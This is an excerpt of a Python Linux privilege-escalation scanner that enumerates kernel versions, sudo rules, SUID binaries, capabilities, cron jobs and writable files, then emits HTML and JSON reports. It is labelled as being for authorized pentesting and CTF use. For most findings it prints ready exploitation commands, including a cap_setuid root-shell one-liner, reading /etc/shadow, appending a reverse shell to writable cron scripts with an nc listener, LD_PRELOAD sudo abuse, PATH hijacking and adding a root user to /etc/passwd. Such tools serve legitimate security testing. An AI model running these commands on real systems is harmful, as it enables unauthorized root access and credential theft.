...
def finding(level, msg):
    icons = {"CRITICAL": f"{RED}[!!!]", "HIGH": f"{RED}[ ! ]",
             "MEDIUM": f"{YELLOW}[ ~ ]", "INFO": f"{CYAN}[ i ]",
             "OK": f"{GREEN}[ ✓ ]"}
...
def enum_system():
    ...
    VULNERABLE_KERNELS = {
        ...
        "5.8":  ("CVE-2021-3156 Sudo Baron Samedit", "https://github.com/blasty/CVE-2021-3156"),
    }

    kernel_version = ".".join(kernel.split(".")[:2])
    for kv, (cve, url) in VULNERABLE_KERNELS.items():
        if kernel.startswith(kv):
            add_finding("CRITICAL", "KERNEL",
                f"Kernel {kernel} may be vulnerable: {cve}",
                technique="Kernel Exploit",
                command=f"# Download from: {url}\ngcc exploit.c -o exploit && ./exploit")
            break
    else:
        finding("OK", f"No known kernel CVE match for {kernel} (manual check still recommended)")
...
def enum_sudo():
    ...
    if "LD_PRELOAD" in sudo_l and "env_keep" in sudo_l:
        add_finding("CRITICAL", "SUDO/LD_PRELOAD",
            "env_keep+=LD_PRELOAD is enabled → LD_PRELOAD privilege escalation possible",
...
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_cmd>""")
    ...
    for binary, gtfocmd in GTFOBINS.items():
        ...
        if re.search(pattern, sudo_l, re.IGNORECASE) or f"NOPASSWD: ALL" in sudo_l:
            add_finding("CRITICAL", "SUDO/GTFOBins",
                f"NOPASSWD sudo on '{binary}' → shell escalation via GTFOBins",
...
def enum_suid():
    ...
    SUID_GTFOBINS = {
        ...
        "sudo":     "# Check sudo version for CVEs (e.g. CVE-2019-14287, CVE-2021-3156)",
    }
    ...
    for line in suid_list.splitlines():
        ...
        if len(parts) >= 11:
            ...
            if bname in SUID_GTFOBINS:
                cmd = SUID_GTFOBINS[bname]
    ...
    if not found_suid:
        finding("INFO", f"SUID files found but none match GTFOBins. Review manually:")
        for line in suid_list.splitlines()[:15]:
...
def enum_capabilities():
    ...
    CAP_EXPLOITS = {
        "cap_setuid": {
            ...
            "view":    "./view -c ':py3 import os; os.setuid(0); os.execv(\"/bin/sh\",[\"sh\",\"-c\",\"reset; exec sh\"])'",
        },
        "cap_net_raw": {
            "desc": "Can send raw packets (tcpdump, sniffing)",
        },
        "cap_dac_read_search": {
            "desc": "Bypass file read permission checks → read /etc/shadow",
            "python3": "python3 -c 'print(open(\"/etc/shadow\").read())'",
        },
        "cap_sys_admin": {
            "desc": "Nearly equivalent to root → many exploits possible",
        },
        "cap_sys_ptrace": {
            "desc": "Can trace processes → inject into root processes",
        },
    }
    ...
    for line in caps.splitlines():
        ...
        for cap, info in CAP_EXPLOITS.items():
            if cap in line:
                desc = info.get("desc", "")
                cmd  = info.get(bname, info.get("python3", "# Check GTFOBins for this binary"))
...
def enum_cron():
    ...
    for line in crontab.splitlines():
        if line.startswith("#") or not line.strip():
            continue
        # Lines that contain a script path
        if "/" in line or ("." in line and " " in line):
            parts = line.split()
            for p in parts:
                if p.startswith("/") or p.endswith(".sh") or p.endswith(".py"):
                    ...
                    if writable:
                        add_finding("CRITICAL", "CRON",
                            ...
                            command=f"""# Add reverse shell to {p}:
echo '{reverse_shell}' >> {p}
chmod +x {p}
# Then start listener: nc -lvp 4444""")
                    elif not exists:
                        # File doesn't exist – we may be able to create it
                        parent = str(Path(p).parent)
                        if os.access(parent, os.W_OK):
                            add_finding("HIGH", "CRON",
                                f"Cron script does not exist and parent dir is writable: {p}",
...
# Listener: nc -lvp 4444""")
                            ...
                            add_finding("INFO", "CRON",
                                f"Cron script missing: {p} (parent dir not writable by us)")
                    else:
                        finding("INFO", f"Cron script exists but not writable by us: {p}")
...
def enum_path():
    ...
    # Find SUID scripts calling relative commands
    suid_scripts = run("find / -type f -perm -04000 \\( -name '*.sh' -o -name '*.py' \\) 2>/dev/null")
    if suid_scripts:
        for f in suid_scripts.splitlines():
            add_finding("HIGH", "PATH/SUID-SCRIPT",
                f"SUID script found: {f} – check for relative command calls",
                technique="PATH Hijacking via SUID Script",
                command=f"""# Check what commands are called:
cat {f}
# Add /tmp to PATH and create fake command there:
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/<cmd_name>
...
def enum_writable():
    ...
    if os.access("/etc/passwd", os.W_OK):
        add_finding("CRITICAL", "WRITABLE",
            "/etc/passwd is writable → add root user",
...
su hacker""")
    ...
    if os.access("/etc/shadow", os.W_OK):
        add_finding("CRITICAL", "WRITABLE",
            "/etc/shadow is writable → change root password",
...
# Replace root hash in /etc/shadow then: su root""")
    ...
    # SSH keys
    ssh_dirs = run("find /home /root -name 'authorized_keys' -o -name 'id_rsa' 2>/dev/null")
    for f in ssh_dirs.splitlines():
        if os.access(f, os.R_OK):
            add_finding("HIGH", "SSH-KEYS",
                f"Readable SSH key/authorized_keys: {f}",
                technique="SSH Key Extraction")

    # .bash_history / env files with passwords
    hist = run("cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|sudo\\|su ' | head -20")
    if hist:
        add_finding("MEDIUM", "BASH_HISTORY",
            "Interesting entries in bash history (possible credentials)",
            command=f"# Found:\n{hist}")

    # World-writable scripts
    ww_scripts = run("find /etc /opt /usr/local -perm -o+w -name '*.sh' 2>/dev/null")
...
def enum_network():
    ...
    print(interfaces[:800])
    print(f"\n{CYAN}── Listening ports ──{RESET}")
    print(listening[:800])

    # Check for internal services on interesting ports
    interesting = ["3306", "5432", "27017", "6379", "8080", "8443", "8888", "9200"]
    for port in interesting:
        if port in listening:
            add_finding("MEDIUM", "NETWORK",
                f"Internal service on port {port} – may be accessible locally",
                technique="Port Forwarding / Lateral Movement")
...
<style>
  ...
  * {{ box-sizing:border-box; margin:0; padding:0; }}
  ...
  header {{
    ...
    border-bottom: 1px solid #ff444422;
  ...
  /* ── LAYOUT ── */
  .container {{ display:grid; grid-template-columns:280px 1fr; gap:0; min-height:calc(100vh - 200px); }}

  /* ── SIDEBAR ── */
  aside {{
    background:var(--bg2); border-right:1px solid var(--border);
    padding:1.5rem; position:sticky; top:0; height:fit-content;
  }}
  ...
  .card:hover {{ transform:translateX(4px); box-shadow: -4px 0 20px rgba(255,68,68,.1); }}
  .card-header {{ display:flex; align-items:center; gap:.8rem; flex-wrap:wrap; }}
  .badge {{
    font-size:.65rem; font-weight:700; font-family:var(--mono);
    padding:.2rem .6rem; border-radius:3px; color:#000; letter-spacing:1px;
  ...
  .tag {{
    ...
    background:#ffffff11; color:#888; font-family:var(--mono);
  }}
  .gtfo-link {{
    font-size:.75rem; color:var(--cyan); text-decoration:none;
    font-family:var(--mono); opacity:.8;
  }}
  .gtfo-link:hover {{ opacity:1; text-decoration:underline; }}
  .code-block {{
    margin-top:.8rem; background:#000; border:1px solid #1e2636;
    border-radius:5px; padding:1rem; overflow-x:auto;
  }}
  .code-block pre {{
    font-family:var(--mono); font-size:.78rem; color:#88cc88;
    white-space:pre-wrap; word-break:break-word;
  }}
  .no-findings {{
    text-align:center; padding:4rem; color:#444; font-size:1.1rem;
  }}

  /* ── FOOTER ── */
  footer {{
    background:var(--bg2); border-top:1px solid var(--border);
    padding:1.5rem 3rem; font-size:.75rem; color:#555; font-family:var(--mono);
...
<header>
  ...
  <div class="warning-banner">
    ⚠ FOR AUTHORIZED PENTESTING AND CTF USE ONLY — Unauthorized use is illegal
  </div>
</header>
...
<div class="container">
  ...
  <main>
    ...
    <div class="filters">
      ...
      <button class="filter-btn" onclick="filter('CRITICAL')" style="border-color:#ff444466">Critical ({counts['CRITICAL']})</button>
      <button class="filter-btn" onclick="filter('HIGH')" style="border-color:#ff880066">High ({counts['HIGH']})</button>
    ...
    <div id="findings">
      {''.join(finding_cards) if findings else '<div class="no-findings">🎉 No findings — system appears hardened</div>'}
    </div>
  </main>
</div>

<footer>
  <span>privesc_scanner.py — automated linux privilege escalation enumeration</span>
...
function filter(level) {{
  ...
  document.querySelectorAll('.card').forEach(c => {{
    ...
    with open(output_path, "w") as f:
        f.write(html)
    print(f"\n  {GREEN}[✓] HTML report saved: {output_path}{RESET}")
...
def main():
    ...
    # Save JSON report
    json_path = f"/tmp/privesc_report_{run('hostname')}.json"
    with open(json_path, "w") as jf:
        json.dump(report, jf, indent=2)
    print(f"\n  {GREEN}[✓] JSON report: {json_path}{RESET}")

    # Generate HTML report
    html_path = f"/tmp/privesc_report_{run('hostname')}.html"
    generate_html_report(html_path)

    print(f"\n  {CYAN}To view the report, transfer the HTML file and open in a browser.{RESET}")
    print(f"  {CYAN}Or: python3 -m http.server 8080 --directory /tmp{RESET}")
    print()
